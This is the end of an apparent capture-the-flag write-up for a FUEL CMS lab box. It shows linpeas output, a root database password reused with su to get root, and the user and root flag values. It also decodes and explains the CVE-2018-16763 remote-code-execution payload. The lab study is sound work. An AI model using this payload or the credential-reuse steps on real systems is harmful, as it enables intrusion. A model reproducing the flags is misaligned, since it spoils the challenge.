/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/lang/ar.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/lang/bg.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/lang/ca.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/lang/cs.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/specialchar.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/table
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/table/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/table/dialogs/table.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/tabletools
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/tabletools/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/tabletools/dialogs/tableCell.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/LICENSE.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/README.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/dialogs/ciframe.html
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/dialogs/tmpFrameset.html
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/dialogs/wsc.css
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/dialogs/wsc.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/wsc/dialogs/wsc_ie.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/dialog.css
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/dialog_ie.css
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/dialog_ie7.css
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/dialog_ie8.css
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/dialog_iequirks.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/images/hidpi
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/skins/moono/readme.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/styles.js
/var/www/html/fuel/modules/fuel/assets/js/editors/markitup
/var/www/html/fuel/modules/fuel/assets/js/editors/markitup/jquery.markitup.js
/var/www/html/fuel/modules/fuel/assets/js/editors/markitup/jquery.markitup.set.js
/var/www/html/fuel/modules/fuel/assets/js/fuel
/var/www/html/fuel/modules/fuel/assets/js/fuel/controller
/var/www/html/fuel/modules/fuel/assets/js/fuel/controller/AssetsController.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/controller/BaseFuelController.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/controller/BlockController.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/controller/DashboardController.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/controller/LoginController.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/js/fuel/custom_fields.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/edit_mode.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/fuel.min.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/fuel_inline.min.js
/var/www/html/fuel/modules/fuel/assets/js/fuel/global.js
#)You_can_write_even_more_files_inside_last_directory

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
  Group www-data:                                                                                                                                                                                                                           
/dev/shm/linpeas.sh                                                                                                                                                                                                                         

╔══════════╣ Searching passwords in config PHP files
        'password' => 'mememe',                                                                                                                                                                                                             

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/brlapi.key
/etc/pam.d/common-password
/usr/bin/credentials-preferences
/usr/lib/evolution-data-server/credential-modules
/usr/lib/evolution-data-server/credential-modules/module-credentials-goa.so
/usr/lib/evolution-data-server/credential-modules/module-credentials-uoa.so
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/libreoffice/program/libpasswordcontainerlo.so
/usr/lib/libreoffice/share/config/soffice.cfg/cui/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/modules/scalc/ui/retypepassworddialog.ui
/usr/lib/libreoffice/share/config/soffice.cfg/sfx/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/masterpassworddlg.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/setmasterpassworddlg.ui
/usr/lib/libreoffice/share/config/soffice.cfg/vcl/ui/cupspassworddialog.ui
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/pppd/2.4.7/passwordfd.so
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/lib/x86_64-linux-gnu/signon/libpasswordplugin.so
/usr/lib/x86_64-linux-gnu/unity-control-center-1/panels/libcredentials.so
/usr/share/app-install/desktop/password-gorilla:password-gorilla.desktop
/usr/share/app-install/desktop/unity-control-center-signon:credentials-preferences.desktop
/usr/share/app-install/desktop/unity-control-center-signon:unity-credentials-panel.desktop
/usr/share/app-install/icons/credentials-preferences.png
/usr/share/app-install/icons/password-gorilla.png
/usr/share/app-install/icons/password.png
/usr/share/app-install/icons/preferences-desktop-user-password.svg
  #)There are more creds/passwds files in the previous parent folder

/usr/share/applications/unity-credentials-panel.desktop
/usr/share/dbus-1/services/com.canonical.indicators.webcredentials.service
/usr/share/dbus-1/services/com.canonical.webcredentials.capture.service
/usr/share/dns/root.key
/usr/share/doc/signon-plugin-password
/usr/share/help-langpack/en_AU/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/zenity/password.page
/usr/share/help/C/evince/password.page
/usr/share/help/C/file-roller/password-protection.page
/usr/share/help/C/file-roller/troubleshooting-password.page
/usr/share/help/C/gnome-help/user-changepassword.page
/usr/share/help/C/gnome-help/user-goodpassword.page
/usr/share/help/C/onboard/password-dialogs.page
/usr/share/help/C/seahorse/keyring-update-password.page
/usr/share/help/C/seahorse/passwords-stored-create.page
/usr/share/help/C/seahorse/passwords-view.page
/usr/share/help/C/ubuntu-help/user-changepassword.page
/usr/share/help/C/ubuntu-help/user-forgottenpassword.page
/usr/share/help/C/ubuntu-help/user-goodpassword.page
/usr/share/help/C/web-credentials
/usr/share/help/C/zenity/figures/zenity-password-screenshot.png

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                                                                                                            
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2019-02-26 23:57:30 configure base-passwd:amd64 3.5.39 3.5.39
2019-02-26 23:57:30 install base-passwd:amd64 <none> 3.5.39
2019-02-26 23:57:30 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:57:30 status half-installed base-passwd:amd64 3.5.39
2019-02-26 23:57:30 status installed base-passwd:amd64 3.5.39
2019-02-26 23:57:30 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:57:31 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:57:31 status half-installed base-passwd:amd64 3.5.39
2019-02-26 23:57:31 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:57:31 upgrade base-passwd:amd64 3.5.39 3.5.39
2019-02-26 23:57:35 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2019-02-26 23:57:35 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:57:35 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:57:36 configure base-passwd:amd64 3.5.39 <none>
2019-02-26 23:57:36 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:57:36 status installed base-passwd:amd64 3.5.39
2019-02-26 23:57:36 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:57:40 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2019-02-26 23:57:40 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:57:40 status installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:57:40 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:03 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
2019-02-26 23:58:03 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:03 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:58:03 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:03 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:58:03 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:03 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:58:03 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
2019-02-27 00:00:54 install signon-plugin-password:amd64 <none> 8.58+16.04.20151106-0ubuntu1
2019-02-27 00:00:54 status half-installed signon-plugin-password:amd64 8.58+16.04.20151106-0ubuntu1
2019-02-27 00:00:54 status unpacked signon-plugin-password:amd64 8.58+16.04.20151106-0ubuntu1
2019-02-27 00:02:38 configure signon-plugin-password:amd64 8.58+16.04.20151106-0ubuntu1 <none>
2019-02-27 00:02:38 status half-configured signon-plugin-password:amd64 8.58+16.04.20151106-0ubuntu1
2019-02-27 00:02:38 status installed signon-plugin-password:amd64 8.58+16.04.20151106-0ubuntu1
2019-02-27 00:02:38 status unpacked signon-plugin-password:amd64 8.58+16.04.20151106-0ubuntu1
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                          
                                ╚════════════════╝                                      
```

If we look carefully, we can see this
```
-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => 'mememe',
        'database' => 'fuel_schema',
```

Which correspond to the message displayed when entering the website on step 2.
```
After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
```

Showing this 'database.php'
```
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
```

We can see the password 'mememe' is attached to a username 'root'.

Let's try it then
```
(remote) www-data@ubuntu:/$ su root
Password: mememe 
root@ubuntu:/# 
```

We got root !!

Let's get flag
```
root@ubuntu:/# cat /root/root.txt

b9bbcb33e11b80be759c4e844862482d 
```

## Flag

1. User

```
6470e394cbf6dab6a91682cc8585059b 
```

2. Privesc

```
b9bbcb33e11b80be759c4e844862482d
```

### To Go Further

I noticed it after the end of the challenge, but main page display this at the bottom
```
That's it!

To access the FUEL admin, go to:
http://10.10.158.215/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```

This vulnerability has been reported in [1] as CVE-2018-16763 and described as
```
FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter. This can lead to Pre-Auth Remote Code Execution.
```

When looking at the code in [2]
```
@@ -900,6 +900,7 @@ public function select()
                $filter = str_replace(':any', '.+', str_replace(':num', '[0-9]+', $filter));
                $this->js_controller_params['method'] = 'select';


                $this->load->helper('array');
                $this->load->helper('form');
                $this->load->library('form_builder');
@@ -921,15 +922,16 @@ public function select()
                // apply filter
                if ( ! empty($filter))
                {
                        $filter_callback = create_function('$a', 'return preg_match(\'#^'.$filter.'$#\', $a);');

                        if (!empty($has_pdfs))
                        {
                                $options[lang('page_select_pages')] = array_filter($options[lang('page_select_pages')], $filter_callback);
                                $options[lang('page_select_pdfs')] = array_filter($options[lang('page_select_pdfs')], $filter_callback);
                        }
                        else
                        {
                                $options = array_filter($options, $filter_callback);    
                                $options = array_filter($options, $filter_callback);
                        }
                }


```

We notice that the $filter parameter is not properly escaped.

This line ```$filter = str_replace(':any', '.+', str_replace(':num', '[0-9]+', $filter));``` simply replace the string ':any' by '.+', to be compatible with ```preg_match```.

This line in the exploit
```py
burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
```

looks like this after URL decoding
```py
burp0_url = url "/fuel/pages/select/?filter='+pi(print($a='system'))+$a('" urllib.parse.quote(xxxx) "')+'"
```

As quotes are not escaped, we can break out of the ```preg_match``` function and run some php code.
As the print command will evaluated code inside it before printing it, this command ```print($a='system')``` will create a function 'a' that will represent the ```system``` command.
Next, when calling ```$a(payload)``` this will be interpreted as ```system(payload)```.

I wondered for a while why the ```pi()``` function was used, especially because the ```pi``` function does not take arguments in Php and just return the value of Pi.
I believe this is because the ```print()``` command return 1 (as opposed to ```echo``` that does not return any value), and the ```pi()``` function here is used to not display the returned value of print.
